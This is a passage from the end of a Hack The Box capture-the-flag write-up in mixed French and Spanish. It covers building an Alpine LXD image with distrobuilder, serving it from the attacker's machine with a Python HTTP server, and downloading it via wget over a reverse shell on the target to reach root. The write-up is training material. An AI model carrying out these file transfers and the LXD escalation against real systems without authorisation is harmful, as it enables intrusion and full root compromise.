</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>â¯<span class="w"> </span>go<span class="w"> </span>env
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="nv">GO111MODULE</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="nv">GOARCH</span><span class="o">=</span><span class="s2">&quot;amd64&quot;</span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="nv">GOBIN</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>...
</span></code></pre></div>
<p>Puis pour que cela soit persistent</p>
<p>export PATH=$PATH:/usr/local/go/bin dans le .profile</p>
<p>Une fois cela fait tu peux installer distrobuilder, tu clones et tu fais un simple make dans le dossier.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/lxc/distrobuilder
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">cd</span><span class="w"> </span>distrobuilder
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>make
</span></code></pre></div>
<p>After the build is complete let's download the Alpine YAML file and build it... que estoy hasta las narizes de traducir !</p>
<p>CUIDADITO ! Aqui el Write-up dice que la version es 3.8 pero no esta al dia, mira en https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml en el campo <strong>same_as</strong> para saber cual es el numero de version.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="nv">$HOME</span>/ContainerImages/alpine/
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nb">cd</span><span class="w"> </span><span class="nv">$HOME</span>/ContainerImages/alpine/
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>sudo<span class="w"> </span><span class="nv">$HOME</span>/go/bin/distrobuilder<span class="w"> </span>build-lxd<span class="w"> </span>alpine.yaml<span class="w"> </span>-o<span class="w"> </span>image.release<span class="o">=</span><span class="m">3</span>.12
</span></code></pre></div>
<p>Despues de esto tenemos dos ficheros llamados <strong>lxd.tar.xz</strong> y <strong>rootfs.squashfs</strong> que han sido creados en el folder.</p>
<p>Nous devrons maintenant transfÃ©rer ces fichiers vers le systÃ¨me cible via l'utilisation d'un serveur HTTP Python.
ExÃ©cutez la commande suivante localement sur le mÃªme dossier.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
</span></code></pre></div>
<p>Revenez ensuite au shell inversÃ© sur le systÃ¨me cible et tÃ©lÃ©chargez les fichiers.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>wget<span class="w"> </span>http://10.10.15.253:8000/lxd.tar.xz
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>wget<span class="w"> </span>http://10.10.15.253:8000/rootfs.squashfs
</span></code></pre></div>
<p><img alt="alpine 0 img" src="../../img/alpine0.png" /></p>
<p>AprÃ¨s Ãªtre entrÃ© en root je me suis fait Ã©jecter juste avant de rÃ©cupÃ©rer le flag ! donc il a fallu revenir refaire le mouvement lateral puis heureusement que le container Ã©tait en train de tourner donc du coup je suis entrÃ© et j'ai pris le flag.</p>
<p><a href="https://www.hackthebox.com/achievement/machine/944728/292">Pwned</a></p>
<hr />
<div style="text-align: right;"><a href="#" >up &uarr;</a>&nbsp;</div>












                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Retour en haut de la page
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Pied de page" >
        
          
          <a href="../unified/" class="md-footer__link md-footer__link--prev" aria-label="PrÃ©cÃ©dent: Unified">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                PrÃ©cÃ©dent
              </span>
              <div class="md-ellipsis">
                Unified
              </div>
            </div>
          </a>
        
        
          
          <a href="../../redes/intro/" class="md-footer__link md-footer__link--next" aria-label="Suivant: Las redes informÃ¡ticas">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Suivant
              </span>
              <div class="md-ellipsis">
                Las redes informÃ¡ticas
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/rnek0" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
    </a>
  
    
    
      
    
    
    
      
      
    
    <a href="https://hispagatos.space/@oggy" target="_blank" rel="noopener me" title="hispagatos.space" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.5 102.5 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5m-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "toc.integrate", "navigation.top", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy", "navigation.footer"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copi\u00e9 dans le presse-papier", "clipboard.copy": "Copier dans le presse-papier", "search.result.more.one": "1 de plus sur cette page", "search.result.more.other": "# de plus sur cette page", "search.result.none": "Aucun document trouv\u00e9", "search.result.one": "1 document trouv\u00e9", "search.result.other": "# documents trouv\u00e9s", "search.result.placeholder": "Taper pour d\u00e9marrer la recherche", "search.result.term.missing": "Non trouv\u00e9", "select.version": "S\u00e9lectionner la version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js"></script>
      
        <script src="../../javascripts/extra.js"></script>
      
    
  </body>
</html>